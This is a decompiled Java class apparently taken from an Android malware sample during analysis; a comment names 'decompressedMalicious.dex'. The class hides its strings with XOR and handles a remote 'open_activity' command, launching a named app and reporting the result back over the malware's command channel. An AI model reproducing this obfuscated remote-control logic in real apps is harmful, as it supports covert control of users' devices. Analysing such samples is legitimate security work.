package com.zjxyxnvvp.nxvxchltf.i;

import android.content.Intent;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class j {
    private static short[] $ = {8406, 8393, 8412, 8407, 8422, 8408, 8410, 8397, 8400, 8399, 8400, 8397, 8384, 4984, 4969, 4971, 4963, 4969, 4975, 4973, 1641, 1662, 1640, 1646, 1655, 1647, 1696, 1681, 1681, 1729, 1669, 1678, 1668, 1682, 1679, 1734, 1685, 1729, 1668, 1689, 1672, 1682, 1685, 2797, 2752, 2772, 2767, 2754, 2761, 2756, 2757, 2689};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a() {
        d dVar;
        String $2;
        f b2;
        UIDNwaidobaWIODb uIDNwaidobaWIODb = UIDNwaidobaWIODb.e;
        if (uIDNwaidobaWIODb != null && !UIDNwaidobaWIODb.k && (b2 = (dVar = d.e).c.b(($2 = $(0, 13, 8377)))) != null) {
            String optString = b2.a().optString($(13, 20, 4872));
            try {
                Intent launchIntentForPackage = uIDNwaidobaWIODb.getPackageManager().getLaunchIntentForPackage(optString);
                JSONObject jSONObject = new JSONObject();
                String $3 = $(20, 26, 1563);
                if (launchIntentForPackage == null) {
                    jSONObject.put($3, $(26, 43, 1761));
                    dVar.c.e($2, jSONObject);
                    return;
                }
                jSONObject.put($3, $(43, 52, 2721) + optString);
                dVar.c.e($2, jSONObject);
                uIDNwaidobaWIODb.startActivity(launchIntentForPackage);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }
}
